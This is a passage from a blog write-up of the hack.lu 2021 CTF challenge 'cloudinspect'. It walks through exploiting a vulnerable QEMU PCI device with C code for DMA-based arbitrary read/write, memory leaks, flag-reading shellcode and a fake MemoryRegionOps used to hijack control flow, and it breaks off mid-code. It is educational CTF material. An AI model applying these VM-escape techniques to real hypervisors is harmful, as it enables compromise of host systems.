00:01.3 Class 0680: 8086:7113
00:01.1 Class 0101: 8086:7010
00:02.0 Class 00ff: 1337:1337
</code></pre><p>The output of the command is structured like this:</p>
<pre tabindex="0"><code>Field 1 : 00:02.0 : bus number (00), device number (02) and function (0)
Field 2 : 00ff    : device class
Field 3 : 1337    : vendor ID
Field 4 : 1337    : device ID
</code></pre><p>According to the source code of the PCI device, the vendor ID and the device ID are <code>0x1337</code>, the resource file corresponding to the device is so <code>/sys/devices/pci0000:00/0000:00:02.0/resource0</code>.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="device-interactions">
        Device interactions
        <a data-clipboard-text="https://nasm.re/posts/cloudinspect/#device-interactions" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Device interactions" href="#device-interactions">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>What we need to interact with the device is to get the physical address of a memory area we control, which would act like a shared buffer between our program and the PCI device. To do so we can <code>mmap</code> a few pages, <code>malloc</code> a buffer or just allocate onto the function&rsquo;s stackframe a large buffer. Given that I was following the thedangokyo&rsquo;s write up, I just retrieved a few functions he was using and especially for the shared buffer.</p>
<p>The function used to get the physical address corresponding to an arbitrary pointer is based on the <code>/proc/self/pagemap</code> pseudo-file, for which you can read the format <a
  class="gblog-markdown__link"
  href="https://www.kernel.org/doc/Documentation/vm/pagemap.txt"
  
  >here</a
>. The virt2phys function looks like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">uint64_t</span> <span class="nf">virt2phys</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
		<span class="kt">uint64_t</span> <span class="n">virt</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">p</span><span class="p">;</span>
		<span class="n">assert</span><span class="p">((</span><span class="n">virt</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
		<span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/proc/self/pagemap&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
				<span class="n">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
		<span class="kt">uint64_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">virt</span> <span class="o">/</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="p">;</span>
		<span class="c1">// the pagemap associates each mapped page of the virtual address space 
</span><span class="c1"></span>		<span class="c1">// with its PTE entry, the entry corresponding to the page is at address / PAGE_SZ
</span><span class="c1"></span>		<span class="c1">// and because that&#39;s an array of 64 bits entry, to access the right entry, the
</span><span class="c1"></span>		<span class="c1">// offset is multiplied per 8. 
</span><span class="c1"></span>		<span class="n">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
		<span class="kt">uint64_t</span> <span class="n">phys</span><span class="p">;</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">phys</span><span class="p">,</span> <span class="mi">8</span> <span class="p">)</span> <span class="o">!=</span> <span class="mi">8</span><span class="p">)</span>
				<span class="n">perror</span><span class="p">(</span><span class="s">&#34;read&#34;</span><span class="p">);</span>
		<span class="n">assert</span><span class="p">(</span><span class="n">phys</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1ULL</span> <span class="o">&lt;&lt;</span> <span class="mi">63</span><span class="p">));</span>
		<span class="c1">// asserts the bit IS_PRESENT is set
</span><span class="c1"></span>		<span class="n">phys</span> <span class="o">=</span> <span class="p">(</span><span class="n">phys</span> <span class="o">&amp;</span> <span class="p">((</span><span class="mi">1ULL</span> <span class="o">&lt;&lt;</span> <span class="mi">54</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">*</span> <span class="mh">0x1000</span><span class="p">;</span>
		<span class="c1">// flips out the status bits, and shifts the physical frame address to 64 bits
</span><span class="c1"></span>		<span class="k">return</span> <span class="n">phys</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>To interact with the device we can write the code right bellow:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;assert.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;inttypes.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdbool.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">iomem</span><span class="p">;</span>
<span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">dmabuf</span><span class="p">;</span>
<span class="kt">uint64_t</span> <span class="n">dmabuf_phys_addr</span><span class="p">;</span>
<span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>

<span class="cp">#define PATH &#34;/sys/devices/pci0000:00/0000:00:02.0/resource0&#34;
</span><span class="cp"></span>
<span class="kt">void</span> <span class="nf">iowrite</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">)</span>
<span class="p">{</span>
		<span class="o">*</span><span class="p">((</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">iomem</span> <span class="o">+</span> <span class="n">addr</span><span class="p">))</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">uint64_t</span> <span class="nf">ioread</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span>
<span class="p">{</span>
		<span class="k">return</span> <span class="o">*</span><span class="p">((</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">iomem</span> <span class="o">+</span> <span class="n">addr</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">uint64_t</span> <span class="nf">write_dmabuf</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">offt</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
		<span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span> <span class="p">)</span><span class="n">dmabuf</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CMD</span><span class="p">,</span> <span class="n">CLOUDINSPECT_DMA_PUT_VALUE</span><span class="p">);</span>
		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_DST</span><span class="p">,</span> <span class="n">offt</span><span class="p">);</span>
		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CNT</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_SRC</span><span class="p">,</span> <span class="n">dmabuf_phys_addr</span><span class="p">);</span>
		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_TRIGGER</span><span class="p">,</span> <span class="mh">0x300</span><span class="p">);</span>
		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">uint64_t</span> <span class="nf">read_offt</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">offt</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CMD</span><span class="p">,</span> <span class="n">CLOUDINSPECT_DMA_PUT_VALUE</span><span class="p">);</span>
		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_SRC</span><span class="p">,</span> <span class="n">offt</span><span class="p">);</span>
		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CNT</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_DST</span><span class="p">,</span> <span class="n">dmabuf_phys_addr</span><span class="p">);</span>
		<span class="n">ioread</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_TRIGGER</span><span class="p">);</span>
		<span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span> <span class="p">)</span><span class="n">dmabuf</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
		<span class="kt">int</span> <span class="n">fd1</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">PATH</span><span class="p">,</span> <span class="n">O_RDWR</span> <span class="o">|</span> <span class="n">O_SYNC</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span> <span class="o">==</span> <span class="n">fd1</span><span class="p">)</span> <span class="p">{</span>
				<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Cannot open %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">PATH</span><span class="p">);</span>
				<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
		<span class="p">}</span> <span class="c1">// open resource0 to interact with the device
</span><span class="c1"></span>		
		<span class="n">iomem</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">fd1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// map resource0
</span><span class="c1"></span>		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;iomem @ %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">iomem</span><span class="p">);</span>
		
		<span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/proc/self/pagemap&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
				<span class="n">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
				<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
		<span class="p">}</span>

		<span class="n">dmabuf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
		<span class="n">memset</span><span class="p">(</span><span class="n">dmabuf</span><span class="p">,</span> <span class="sc">&#39;\x00&#39;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">dmabuf</span><span class="p">));</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">MAP_FAILED</span> <span class="o">==</span> <span class="n">iomem</span><span class="p">)</span> <span class="p">{</span>
				<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
		<span class="p">}</span>

		<span class="n">mlock</span><span class="p">(</span><span class="n">dmabuf</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span> <span class="c1">// trigger PAGE_FAULT to acually map the page
</span><span class="c1"></span>		<span class="n">dmabuf_phys_addr</span> <span class="o">=</span> <span class="n">virt2phys</span><span class="p">(</span><span class="n">dmabuf</span><span class="p">);</span> <span class="c1">// grab physical address according to pagemap
</span><span class="c1"></span>		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;DMA buffer (virt) @ %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">dmabuf</span><span class="p">);</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;DMA buffer (phys) @ %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">dmabuf_phys_addr</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>Now we can interact with the device we got two primitive of arbitrary read / write. The <code>read_offt</code> and <code>write_dmabuf</code> functions permit us to read / write a 8 bytes to an arbitrary offset from the <code>dmabuf</code> object address.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="exploitation">
        Exploitation
        <a data-clipboard-text="https://nasm.re/posts/cloudinspect/#exploitation" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Exploitation" href="#exploitation">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>I did a lot of things which didn&rsquo;t worked, so let&rsquo;s summarize all my thoughts:</p>
<ul>
<li>If we leak the object&rsquo;s address, we can write at any location for which we know the base address, for example overwrite GOT pointers (but it will not succeed because of RELRO).</li>
<li>If we take a look at all the memory areas mapped in the qemu process we can see very large memory area in rwx, which means if we can leak its address and if we can redirect RIP, we just have to write and jmp on a shellcode written in this area.</li>
<li>To achieve the leaks, given that the CloudInspectState structure is allocated on the heap, and that we can read / write at an arbitrary offset from the object&rsquo;s address we can:
<ul>
<li>Scan heap memory for pointers to the qemu binary to leak the base address of the binary.</li>
<li>Scan heap memory  for pointers to the heap itself (next, prev pointers for freed objects for example), and then compute the object&rsquo;s address.</li>
<li>Scan heap memory to leak the rwx memory area</li>
<li>Scan all the memory area we can read to find a leak of the rwx memory area.</li>
</ul>
</li>
<li>To redirect RIP I thought to:
<ul>
<li>Overwrite the <code>destructor</code> function pointer in the <code>MemoryRegion</code> structure.</li>
<li>Write in a writable area a fake <code>MemoryRegionOps</code> structure  for which a certain handler points to our shellcode and make <code>CloudInspectState.mmio.ops</code> point to it.</li>
</ul>
</li>
</ul>
<p>According to the environment, scan the heap memory is not reliable at all. I succeed to leak the rwx memory area, the binary base address, the heap base address from some contiguous objects in the heap. To redirect RIP, for some reason, the <code>destructor</code> is never called, so we have to craft a fake <code>MemoryRegionOps</code> structure. And that&rsquo;s how I read the flag on the disk. But the issue is that remotely, the offset between the heap base and the object is not the same, furthermore, the offset for the rwx memory leak is I guess different as well. So we have to find a different way to leak the object and the rwx memory area.</p>
<div class="gblog-post__anchorwrap">
    <h3 id="leak-some-memory-areas">
        Leak some memory areas
        <a data-clipboard-text="https://nasm.re/posts/cloudinspect/#leak-some-memory-areas" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Leak some memory areas" href="#leak-some-memory-areas">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h3>
</div>
<p>To see where we can find pointers to the rwx memory area, we can make use of the <code>search</code> command in <code>pwndbg</code>:</p>
<pre tabindex="0"><code>pwndbg&gt; vmmap                                                                                                                                                                              
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA                                                                                                                                            
    0x559a884e1000     0x559a88791000 r--p   2b0000 0      /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
    0x559a88791000     0x559a88c5d000 r-xp   4cc000 2b0000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
    0x559a88c5d000     0x559a890ff000 r--p   4a2000 77c000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
    0x559a89100000     0x559a89262000 r--p   162000 c1e000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
    0x559a89262000     0x559a89353000 rw-p    f1000 d80000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
    0x559a89353000     0x559a89377000 rw-p    24000 0      [anon_559a89353]                                                                                                                    
    0x559a8a059000     0x559a8b0e7000 rw-p  108e000 0      [heap]                                                                                                                              
    0x7fc5f4000000     0x7fc5f4a37000 rw-p   a37000 0      [anon_7fc5f4000]                                                                                                              
    0x7fc5f4a37000     0x7fc5f8000000 ---p  35c9000 0      [anon_7fc5f4a37]                                                                                                                    
    0x7fc5fbe00000     0x7fc603e00000 rw-p  8000000 0      [anon_7fc5fbe00]                                                                                                                    
    0x7fc603e00000     0x7fc603e01000 ---p     1000 0      [anon_7fc603e00]                                                                                                                    
    0x7fc604000000     0x7fc643fff000 rwxp 3ffff000 0      [anon_7fc604000]                                                                                                                  
    [SKIP]
pwndbg&gt; search -4 0x7fc60400 -w                                                                                                                                                                
[anon_559a89353] 0x559a89359002 0x7fc60400                                                                                                                                                     
[anon_559a89353] 0x559a8935904a 0x7fc60400                                                                                                                                                     
[anon_559a89353] 0x559a89359052 0x1600007fc60400                                                                                                                                               
[anon_559a89353] 0x559a8935905a 0x2d00007fc60400                                                                                                                                               
[anon_559a89353] 0x559a89359062 0xffd300007fc60400                                                                                                                                             
[anon_559a89353] 0x559a89359072 0x7fc60400                                                                                                                                                     
[anon_559a89353] 0x559a89372b2a 0x10100007fc60400                                                                                                                                              
[anon_559a89353] 0x559a89372bb2 0x100000007fc60400                                                                                                                                             
[anon_559a89353] 0x559a89372bba 0xf00000007fc60400                                                                                                                                             
[heap]          0x559a8a2dccf2 0x2d00007fc60400                                                                                                                                                
[heap]          0x559a8a2dccfa 0x7fc60400                                                                                                                                                      
[heap]          0x559a8a2dcd6a 0x7fc60400                                                                                                                                                      
[heap]          0x559a8a2dcefa 0xffd300007fc60400                                                                                                                                              
[heap]          0x559a8a2dcf18 0x7fc60400                                                                                                                                                      
[SKIP]
</code></pre><p>Given that we don&rsquo;t want to get the leak from heap because of the unreliability we can see that there are available leaks in a writable area of the binary in <code>anon_559a89353</code>, indeed the page address looks like a PIE based binary address or an heap address (but the address is not marked heap), and if we look more carefully, the page is contiguous to the last file mapped memory area. Now we can leak the rwx memory area, lets' find a way to leak object&rsquo;s address! I asked on the hack.lu discord a hint for this leak because didn&rsquo;t have any idea. And finally it&rsquo;s quite easy, we can just leak the <code>opaque</code> pointer in the <code>MemoryRegion</code> structure which points to the object&rsquo;s address.</p>
<p>If I summarize we have:</p>
<ul>
<li>A reliable leak of:
<ul>
<li>the object&rsquo;s address with the <code>opaque</code> pointer</li>
<li>the binary base address (from the heap)</li>
<li>the rwx memory area (writable memory area that belongs to the binary).</li>
</ul>
</li>
</ul>
<p>Then we can write this code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// offset I got in gdb locally
</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">base</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">(</span><span class="mh">0x10c0</span> <span class="o">+</span> <span class="mi">8</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xdef90</span><span class="p">;</span> <span class="c1">// heap leak
</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">bss</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0xbc2000</span><span class="p">;</span> <span class="c1">// points to the anonnymous memory area right after the binary
</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">heap_base</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">(</span><span class="mh">0x1000</span> <span class="o">+</span> <span class="mi">8</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xf3bff0</span><span class="p">;</span> <span class="c1">// useless
</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">ops_struct</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">(</span><span class="o">-</span><span class="mh">0xd0</span><span class="p">);</span> <span class="c1">// That&#39;s &amp;ClouInspctState.mmio.ops
</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">addr_obj</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">(</span><span class="o">-</span><span class="p">(</span><span class="mh">0xd0</span><span class="o">-</span><span class="mi">8</span><span class="p">))</span> <span class="o">+</span> <span class="mi">2568</span><span class="p">;</span> <span class="c1">// CloudInspectState.mmio.opaque
</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">leak_rwx</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">((</span><span class="n">bss</span> <span class="o">+</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="o">-</span> <span class="n">addr_obj</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xffff</span><span class="p">;</span> <span class="c1">// leak in the bss
</span><span class="c1"></span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] ops_struct: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ops_struct</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Binary base address: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">base</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Heap base address: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">heap_base</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Leak rwx: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">leak_rwx</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Addr obj: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">addr_obj</span><span class="p">);</span>

<span class="cm">/*
</span><span class="cm">[*] ops_struct: 559a89173f20
</span><span class="cm">[*] Binary base address: 559a88791000
</span><span class="cm">[*] Heap base address: 559a8a0561d0
</span><span class="cm">[*] Leak rwx: 7fc604000000
</span><span class="cm">[*] Addr obj: 559a8af92f88
</span><span class="cm">*/</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h3 id="write-the-shellcode">
        Write the shellcode
        <a data-clipboard-text="https://nasm.re/posts/cloudinspect/#write-the-shellcode" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Write the shellcode" href="#write-the-shellcode">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h3>
</div>
<p>I choose to write a shellcode to read the flag at <code>leak_rwx + 0x5000</code>, a known location we can easily read and print from the program. The shellcode is very simple:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mi">2</span> <span class="c1">; SYS_open</span>
<span class="nf">push</span> <span class="mh">0x67616c66</span> <span class="c1">; flag in little endian</span>
<span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rsp</span> <span class="c1">; pointer flag string</span>
<span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="mi">0</span> <span class="c1">; O_READ</span>
<span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="mh">0x1fd</span> <span class="c1">; mode ?</span>
<span class="nf">syscall</span>
<span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rax</span> <span class="c1">; fd</span>
<span class="nf">xor</span> <span class="nb">rax</span><span class="p">,</span> <span class="nb">rax</span> <span class="c1">; SYS_read</span>
<span class="nf">lea</span> <span class="nb">rsi</span><span class="p">,</span> <span class="p">[</span><span class="nv">rip</span><span class="p">]</span> <span class="c1">; pointer to the rwx memory area (cause we&#39;re executing code within)</span>
<span class="nf">and</span> <span class="nb">rsi</span><span class="p">,</span> <span class="mh">0xffffffffff000000</span> <span class="c1">; compute the base address</span>
<span class="nf">add</span> <span class="nb">rsi</span><span class="p">,</span> <span class="mh">0x5000</span> <span class="c1">; add the right offset</span>
<span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="mh">0x30</span> <span class="c1">; length of the flag to read</span>
<span class="nf">syscall</span>
<span class="nf">add</span> <span class="nb">rsp</span><span class="p">,</span> <span class="mi">8</span><span class="c1">; we pushed the flag str so we destroy it</span>
<span class="nf">ret</span> <span class="c1">; return to continue the execution</span>
</code></pre></div><p>To write the shellcode at <code>leak_rwx + 0x1000</code>, we can directly trigger a large write primitive:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#define CODE &#34;\x48\xc7\xc0\x02\x00\x00\x00\x68\x66\x6c\x61\x67\x48\x89\xe7\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\xfd\x01\x00\x00\x0f\x05\x48\x89\xc7\x48\x31\xc0\x48\x8d\x35\x00\x00\x00\x00\x48\x81\xe6\x00\x00\x00\xff\x48\x81\xc6\x00\x50\x00\x00\x48\xc7\xc2\x30\x00\x00\x00\x0f\x05\x48\x83\xc4\x08\xc3&#34;
</span><span class="cp"></span>
<span class="n">memcpy</span><span class="p">(</span><span class="n">dmabuf</span><span class="p">,</span> <span class="n">CODE</span><span class="p">,</span> <span class="mi">130</span><span class="p">);</span>

<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Writing the shellcode @ %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">leak_rwx</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CMD</span><span class="p">,</span> <span class="n">CLOUDINSPECT_DMA_PUT_VALUE</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_DST</span><span class="p">,</span> <span class="n">leak_rwx</span> <span class="o">-</span> <span class="n">addr_obj</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CNT</span><span class="p">,</span> <span class="mi">130</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_SRC</span><span class="p">,</span> <span class="n">dmabuf_phys_addr</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_TRIGGER</span><span class="p">,</span> <span class="mh">0x300</span><span class="p">);</span>
<span class="cm">/*
</span><span class="cm">[*] Writing the shellcode @ 7fc604001000
</span><span class="cm">*/</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h3 id="craft-fake-memoryregionops-structure">
        Craft fake MemoryRegionOps structure
        <a data-clipboard-text="https://nasm.re/posts/cloudinspect/#craft-fake-memoryregionops-structure" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Craft fake MemoryRegionOps structure" href="#craft-fake-memoryregionops-structure">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h3>
</div>
<p>To cratf a fake <code>MemoryRegionOps</code>, I just read the original <code>MemoryRegionOps</code> structure, I edited the <code>read</code> handler, and I wrote it back, in a writable memory area, at <code>leak_rwx+0x2000</code>. Given that <code>sizeof(MemoryRegionOps)</code> is not superior to <code>DMA_SIZE</code>, I can read and write in one time. Then we got:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// Craft fake MemoryRegionOps structure by reading the original one
</span><span class="c1"></span>
<span class="k">struct</span> <span class="n">MemoryRegionOps</span> <span class="n">fake_ops</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] reading struct mmio.MemoryRegionOps @ %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ops_struct</span><span class="p">);</span>

<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CMD</span><span class="p">,</span> <span class="n">CLOUDINSPECT_DMA_PUT_VALUE</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_SRC</span><span class="p">,</span> <span class="o">-</span><span class="p">(</span><span class="n">addr_obj</span> <span class="o">-</span> <span class="n">ops_struct</span><span class="p">));</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CNT</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">MemoryRegionOps</span><span class="p">));</span>
